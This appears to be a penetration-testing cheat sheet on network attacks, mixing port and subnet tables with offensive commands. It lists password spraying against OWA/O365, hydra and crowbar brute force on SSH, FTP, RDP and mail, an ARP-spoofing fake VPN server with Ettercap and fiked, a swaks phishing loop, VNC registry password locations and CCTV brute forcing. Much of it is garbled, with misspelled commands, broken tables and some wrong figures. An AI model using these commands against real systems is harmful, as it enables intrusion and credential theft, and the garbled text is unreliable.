---
title: Network
sidebar: mydoc_sidebar
permalink: network.html
folder: mydoc
---


# Network

## Common ports

| No Service
| :--- | :--- |
| 21 | FTP
| 22 | SSH
| 23 Tel net |
| 25 | SMTP
| 49 | TACACS |
| 53 DNS |
| 8/67 DHCP \(UDP\) |
| 69 TFTP \(UDP\) |
| 80 | HTTP |
| 88 Kerberos
| 110 | POP3
| 111 RPC |
| 123 NTP \(UDP\) |
| 135 | Windows RPC |
| 137 NetBIOS |
| 138 | NetBIOS |
| 139 | SMB |
| 143 IMAP |
| 161 SNMP \(UDP\) |
| 179 | BGP |
| 201 Apple Talk |
| 389 LDAP |
| 443 HTTPS
| 445 | SMB |
| 500 | ISAKMP \(UDP\) |
| 514 Syslog |
| 520 | R.I.P
| 7/546 DHCPv6 |
| 587 SMTP
| 902 VMware |
| 1080 | Socks Proxy |
| 1194 | VPN |
| 1433/4 MS-SQL |
| 1521 | Oracle |
| 1629 | DarneWare |
| 2049 | NFS |
| 3128 | Squid Proxy |
| 3306 | MySQL |
| 3389 | RDP
| 5060 | SIP |
| 5222 | Jabber |
| 5432 | Postgres
| 5666 | Nagios |
| 5900 | VNC
| 6000 | X11 |
| 6129 | DameWare |
| 6667 | IRC |
| 9001 | Tor |
| 9001 | HSQL |
| 9090/1 Open fire
| 9100 | Jet Direct |

## Get operating system information with TTL

| os | size |
| :--- | :--- |
| Windows | 128 |
| Linux | 64 |
| | 255 |
| Solaris | 255 |

## ftp status codes

| situation | code |
| :--- | :--- |
| Waiting for user login 220 |
| Not authenticated 530 |

## http status codes

| situation | code |
| :--- | :--- |
| Successful connection 200 |
| Lack of access 403


## IPV4 information

### Classful range

| name | start | end
| :--- | :--- | :--- |
| A 0.0.0.0 | 127.255.255.255 |
| B 128.0.0.0 | 191.255.255.255 |
| C| 192.0.0.0 | 223.255.255.255 |
| D 224.0.0.0 | 239.255.255.255 |
| E| 240.0.0.0 | 255.255.255.255 |


### Range Reversed

| start | end |
| :--- | :--- |
| 10.0.0.0 | 10.255.255.255 |
| 127.0.0.0 | 127.255.255.255 |
| 172.16.0.0 | 172.31.255.255 |
| 192.168.0.0 | 192.168.255.255 |

### Subnetting

|  |  |  |
| :--- | :--- | :--- |
| /31 | 255.255.255.254 | 1 Host |
| /30 | 255.255.255.252 | 2 Hosts |
| /29 | 255.255.255.248 | 6 Hosts |
| /28 | 255.255.255.240 | 14 Hosts |
| /27 | 255.255.255.224 | 30 Hosts |
| /26 | 255.255.255.192 | 62 Hosts |
| /25 | 255.255.255.128 | 126 Hosts |
| /24 | 255.255.255.0 | 254 Hosts |
| /23 | 255.255.254.0 | 510 Hosts |
| /22 | 255.255.252.0 | 1022 Hosts |
| /21 | 255.255.248.0 | 2046 Hosts |
| /20 | 255.255.240.0 | 4096 Hosts |
| /19 | 255.255.224.0 | 8190 Hosts |
| /18 | 255.255.192.0 | 16382 Hosts |
| /17 | 255.255.128.0 | 32766 Hosts |
| /16 | 255.255.0.0 | 65534 Hosts |
| /15 | 255.254.0.0 | 131070 Hosts |
| /14 | 255.252.0.0 | 262142 Hosts |
| /13 | 255.248.0.0 | 524286 Hosts |
| /12 | 255.240.0.0 | 1048574 Hosts |
| /11 | 255.224.0.0 | 2097150 Host |
| /10 | 255.192.0.0 | 4194302 Host |
| /9 | 255.128.0.0 | 8388606 Host |
| /8 | 255.0.0.0 | 16777214 Hosts |

## Calculate the subnet range

```text
Given: 1.1.1.101/28
/28 = 255.255.255.240 netmask
256 - 240 = 16 = subnet ranges of 16, i.e.
    1.1.1.0
    1.1.1.16
    1.1.1.32 ...
Range where given IP falls: 1.1.1.96 - 1.1.1.111
```

## IPV6 information

### Broadcast addresses

```text
ff02::1 - link-local nodes
ff05::1 - site-local nodes
ff01::2 - node-local routers
ff02::2 - link-local routers
ff05::2 - site-local routers
```

### Interface addresses


```text
fe80:: -link-local
2001:: - routable
::a.b.c.d- IPv4 compatible IPv6
::ffff:a.b.c.d- IPv4 mapped IPv6
```

### ipv6 toolbox

```text
Remote Network DoS:
rsumrf6 eth# remote ipv6
```


### port forward with chisel

```text
./chisel server -p 9000 --reverse
./chisel client <ip>:9000 R:4500:127.0.0.1:4500
```

Or 

```text
./chisel server -p 9000 --reverse
./chisel client <ip>:9000 R:socks
```
 

### ipv6 tunnel in ipv4 with socat

```text
socat TCP-LISTEN:8080,reuseaddr,fork TCP6:[2001::]:80
./nikto.pl -host 12-.0.0.1 -port 8080
```
## Cisco commands

| Command | Description 
| :--- | :--- 
| enable | Enable privilege mode 
| #configure terminal | interface settings 
| (config)#interface fa0/0 | Configure FastEthernet 0/0 
| (config-if)#ip addr 1.1.1.1 255.255.255.0 | Set IP to fa0/0 
| (config)#line Vty 0 4 | set vty line 
| (config-line)#login | Set telnet password 
| (config-line)#password password | Set password for telnet 
| #show session | reopen session 
| #show version | IOS version 
| #dir file systems | Available files 
| #dir all-filesystems | File Information 
| #dir /all | Delete files 
| #show running-config | settings in memory 
| #show startup-config | Settings inside boot 
| #show ip interface brief | List of Interfaces 
| #show interface e0 | interface information details 
| #show ip route | List of Routes 
| #show access-lists | Access Lists 
| #terminal length 0 | No limit on output
| #copy running-config startup-config | Place settings from memory to boot 
| #copy running-config tftp | Copy settings on tftp


### IOS 11.2-12.2 vulnerabilities

```text
http:// ip /level/ 16-99 /exec/show/config
```

## SVN

List of files and folders

```text
svn list svn://10.10.10.10/Empty/
```

activity reports

```text
svn log svn://10.10.10.10/
```

change list

```text
svn diff -c r2 svn://10.10.10.10
```


## Guess the password of OVA, O365, skype business

```text
python3 atomizer.py owa 10.10.10.10 pass.txt user.txt -i 0:0:01
```

## SNMP protocol

Need to start the tftp service

```text
./snmpblow.pl -s srcip -d rtr_ip -t attackerip -f out.txt
snmpstrings.txt
```

### Windows executive services list

```text
snrnpwalk -c public -v1 ip 1 | grep hrSWRJnName | cut -d" " -f4
```

### Windows open ports

```text
smpwalk | grep tcpConnState | cut -d" " -f6 | sort-u
```

### Installed software

```text
smpwalk | grep hrSWInstalledName
```

### Windows users

```text
snmpwalk ip 1.3 | grep 77.1.2.25 -f4
```

### Shared files

```text
snmpwalk -v 1 -c public 10.13.37.10
```

## Listening with responder

```text
responder -I eth1 -v
```

## Packet recording

### Recording of port packets 22-23

```text
tcpdump -nvvX -sO -i eth0 tcp portrange 22-23
```

### Capture specific ip traffic other than subnet


```text
tcpdump -I eth0 -tttt dst ip and not net 1.1.1.0/24
```

### Traffic recording 192.1

```text
tcpdump net 192.1.1
```

### Timed recording of traffic

```text
dumpcap -I eth0 -a duration: sec -w file file.pcap
```

### Check Reply PCAP

```text
file2cable -i eth0 -f file.pcap
```

### Checking Reply packets \(FUZZ \| Dos\)

```text
tcpreplay --topspeed --loop=O --intf=eth0 .pcap_file_to replay rnbps=10|100|1000
```

### DNSRecon command

```text
Reverse lookup for IP range:
./dnsrecon.rb -t rvs -i 192.1.1.1,192.1.1.20
Retrieve standard DNS records:
./dnsrecon.rb -t std -d domain.corn
Enumerate suborders:
./dnsrecon.rb -t brt -d domain.corn -w hosts.txt
DNS zone transfer:
./dnsrecon -d domain.corn -t axfr
```

### reverse dns lookup operation and checking the output with nmap

```text
nmap -R -sL -Pn -dns-servers dns svr ip range | awk '{if( ($1" "$2"
"$3)=="Nmap scan report")print$5" "$6}' | sed 's/(//g' I sed 's/)//g'
dns.txt
```

## VPN

### Write psk on the file

```text
ike-scan -M -A vpn ip -P file
```

### attack vpn server

```text
ike-scan -A -t 1 --sourceip= spoof ip dst ip
```

### Fiked - Create fake vpn server


```text
Must know the VPN group name a~d pre-shared key;
1. Ettercap filter to drop IPSEC traffic (UDP port 500)
   if(ip.proto == UDP && udp.scc == 500) {
      kill();
      drop();
      msg (" UDP packet dropped ") ;
2. Compile filter
   etterfilter udpdrop.filter -o udpdrop.ef
3. Start Ettercap and drop all IPSEC ~raffic
   #ettercap -T -g -M arp -F udpdrop.ef // //
4. Enable IP Forward
   echo "1" /proc/sys/net/ipv4/ip_forward
5. Configure IPtables to port forward to Fiked server
    iptables -t nat -A PREROUTING -p udp -I eth0 -d VPN Server IP -j
   DNAT - - to Attacking Host IP
    iptables -P FORWARD ACCEP~
6. Start Fiked to impersonate the VPN Server
   fiked - g vpn gatewa; ip - k VPN Group Name:Group Pre-Shared Ke;
7. Stop Ettercap
8. Restart Ettercap without the filter
   ettercap -T -M arp II II
```

### Guess username with hydra

```text
hydra -L ~/seclists/Usernames/Names/femalenames-usa-top1000.txt -p Welcome123! IP PROTOCOL
```

### Display smb paths with smbclient

```text
smbclient -U USERNAME -L IP
```

### Accessing the system environment using WRM

```text
ruby evil-winrm.rb -u USER -p PASS -i IP
```

## Directing local traffic to a specified address

```text
simpleproxy -L 8000 -R 10.10.10.10:1337
```

## Putty software

### Registry key to report any operation by putty (even commands and outputs)

```text
[HKEY_CURRENT_USER\Software\Si~onTatham\Putt;\Sessions\Default%20Settings]
"LogFileName"="%TEMP%\putty.dat"
"LogType"=dword:00000002"
```

## ldap

### Search for important ldap information using impackt

```text
ldapsearch -h <host> -x -b "dc=<dc>,dc=local"
```

### Display all ldap structural information

```text
ldapsearch -x -LLL -w PASSWORD
```

#ftp

### Connect to ftp with username and password

```text
lftp -e 'set ssl:verify-certificate false' -u "user,pass" -p 21 10.10.10.10
```

## Printers

### Establish connection

```text
python pret.py 10.10.10.10 pjl
```

## Email sending and smtp password guessing

```text
1.
nc -lvnp 80

2.
while reading mail; do swaks --to $mail --from it@sneakymailer.htb --header "Subject: Credentials /
Errors" --body "goto http://10.10.10.19/" --server 10.10.10.10; done < mails.txt
```

## vnc

### Decode the VNC Install.reg file


```text
vncpwd.exe <ENCRYPTEDPASSWORD>
```

Oe 

```text
RealVNC
HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver
Value: Password

TightVNC
HKEY_CURRENT_USER\Software\TightVNC\Server
HKLM\SOFTWARE\TightVNC\Server\ControlPassword

tightvnc.ini
vnc_viewer.ini
Value: Password or PasswordViewOnly

TigerVNC
HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4
Value: Password

UltraVNC
C:\Program Files\UltraVNC\ultravnc.ini
Value: passwd or passwd2
```

[more info](https://github.com/frizb/PasswordDecrypts)

##CCTV

### Data collection
```text
nmap -Pn -sV --script "rtsp-*" -p 554 10.10.10.10/24
```

### Guess the password

```text
rtspbrute -t ip.txt -p 554
```


### Jack of all trades

```text
docker run -t ullaakut/cameradar -t 192.168.100.0/24
```


## SSH

connect to SSH service on the target

```
ssh <target> 
```

scan for open SSH port on the target

```
nmap -p 22 <target> - 
```

brute force SSH login

```
hydra -L users.txt -P passwords.txt ssh://<target> - 
```

## 80 (HTTP)

retrieve content from the HTTP server on the target

```
curl http://<target> - 
```

scan for open HTTP port on the target

```
nmap -p 80 <target> 
```

directory enumeration on the HTTP server

```
dirb http://<target> 
```


## 443 (HTTPS)

retrieve content from the HTTPS server on the target

```
curl https://<target> 
```

scan for open HTTPS port on the target

```
nmap -p 443 <target> 
```

perform SSL/TLS vulnerability scan on HTTPS server

```
sslscan <target>:443 
```


## 21 (FTP)


connect to FTP service on the target

```
ftp <target> 
```

scan for open FTP port on the target

```
nmap -p 21 <target> 
```

brute force FTP login

```
hydra -l <username> -P passwords.txt ftp://<target> 
```


## 25 (SMTP)


connect to SMTP service on the target

```
telnet <target> 25 
```

scan for open SMTP port on the target

```
nmap -p 25 <target> 
```

enumerate valid users on SMTP server

```
smtp-user-enum -M VRFY -U users.txt -t <target> 
```


## 53 (DNS)


perform DNS lookup on the target

```
nslookup <target> 
```

scan for open DNS port on the target

```
nmap -p 53 <target> 
```

perform DNS enumeration on the target

```
dnsrecon -d <target> 
```



## 110 (POP3)


connect to POP3 service on the target

```
telnet <target> 110 
```

scan for open POP3 port on the target

```
nmap -p 110 <target> 
```

brute force POP3 login

```
hydra -l <username> -P passwords.txt pop3://<target> 
```


## 143 (IMAP)

connect to IMAP service on the target

```
telnet <target> 143 
```

scan for open IMAP port on the target

```
nmap -p 143 <target> - 
```

brute force IMAP login

```
hydra -l <username> -P passwords.txt imap://<target> - 
```

## 3306 (MySQL)


connect to MySQL service on the target

```
mysql -h <target> -u <username> -p 
```

scan for open MySQL port on the target

```
nmap -p 3306 <target> 
```

perform SQL injection on MySQL database

```
sqlmap -u "http://<target>/index.php?id=1" --dbs 
```


## 3389 (RDP)


connect to RDP service on the target


```
rdesktop <target> 
```

scan for open RDP port on the target

```
nmap -p 3389 <target> 
```

brute force RDP login

```
crowbar -b rdp -s <target>/32 -u users.txt -C passwords.txt 
```

## 5900 (VNC remote desktop)

connect to VNC service on the target

```
vncviewer <target> 
```

```
nmap -p 5900 <target>
```



{% include links.html %}
